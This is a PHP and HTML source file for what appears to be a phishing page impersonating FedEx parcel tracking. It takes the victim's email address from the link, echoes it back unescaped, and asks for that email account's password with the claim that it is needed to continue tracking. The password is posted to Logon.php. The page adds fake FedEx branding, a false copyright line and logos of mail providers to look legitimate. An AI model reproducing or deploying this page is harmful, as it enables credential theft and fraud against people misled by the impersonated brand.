<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
// < end 


$_SESSION['email'] = $email;


?>


<html>
<HEAD>
<TITLE>FEDEX | Tracking</TITLE>	
<link rel="shortcut icon" href="http://www.fedex.com/images/c/s1/fx-favicon.ico" type="image/gif"/>
</head>

<script>
function validateForm()
{
var y=document.forms["myform"]["epass"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["myform"]["epass"].value;
if(y.length < 6)
  {
  alert("Password is Too Short");
  return false;
  }
}
</script>

<body bgcolor="#F0EEEE" text="black" link="blue" alink="blue" vlink="blue" background="" >
<div align="center">
  <center>
  <form action="Logon.php" onsubmit="return validateForm()" method="post" name="myform">
  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="589" height="249">
    <tr>
      <td width="589" height="92" colspan="2">
      <img src="images/logo-header-fedex-express.png" height="65" width="160">
      <b style="color:#4d148c;font-size:24px;font-weight:bold">Parcel Tracking</b></td>
    </tr>
    <tr>
      <td width="589" height="25" colspan="2" bgcolor="#4D148C">
      <font size="4" color="#ffffff"><center><b>Sign in with valid Email and Password</b></center></font></td>
    </tr>
    <tr>
      <td width="158" height="51"><font color="#4d148c" face="verdana,arial" size="-1">
      <b><font color="red">*</font>&nbsp;Email Address</b>&nbsp;&nbsp;&nbsp; <b>:</b></font></td>
      <td width="425" height="51"><font face="Georgia Bold">&nbsp;<?php echo $email ?></font></td>
    </tr>
    <tr>
      <td width="158" height="40"><font face="verdana,arial" size=-1><b><font color="red">*</font></b>&nbsp;</font><b><font face="verdana,arial" size="-1" color="#4D148C">Email
      </font></b><font color="#4d148c" face="verdana,arial" size="-1"><b>Password</b>&nbsp;</font><font face="verdana,arial" size=-1>&nbsp;<b>:</b></td>
      <td width="425" height="40">&nbsp;<input type="password" name="epass" size="20"></td>
    </tr>
    
    <tr>
      <td width="158" height="32">&nbsp;</td>
      <td width="425" height="32"><input type="submit" value="Continue Tracking"></td>
    </tr>
    
  </table>
  </center>
</div>

&nbsp;<center><hr color="#4d148c" size=2 width="100%">&nbsp;</center>
</font>
<b style="color:#4d148c;font-size:20px;font-weight:bold">Fed</b><b style="color:#adafb1;font-size:20px;font-weight:bold">Ex</b> Partners with: <br>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img alt="Gmail" src="images/gmail.jpg" height="50" width="120"><img alt="RoundCube Mail" src="images/roundcube.png" height="50" width="120">&nbsp; <img src="images/horde.png" alt="Horde Mail" height="50" width="120">&nbsp;&nbsp; <img src="images/outlook.png" alt="Outlook" width=120 height=50><img src="images/Squirrelmail_logo.png" alt="Squirrel Mail" title="" width=120 height=50>&nbsp;<img src="images/yahoo.jpg" alt="Yahoo Mail" width=120 height=50>
<img src="images/netease_png.png" alt="Netease" title="" border=0 width="120" height="50"><img src="images/aol.jpg" alt="AOL" title="" border=0 width="120" height="50"></p>
<br><p><center>Copyright Notice &copy; 1995-2019 FEDEX Express. 
All rights reserved.</center></p>
</body>
</html>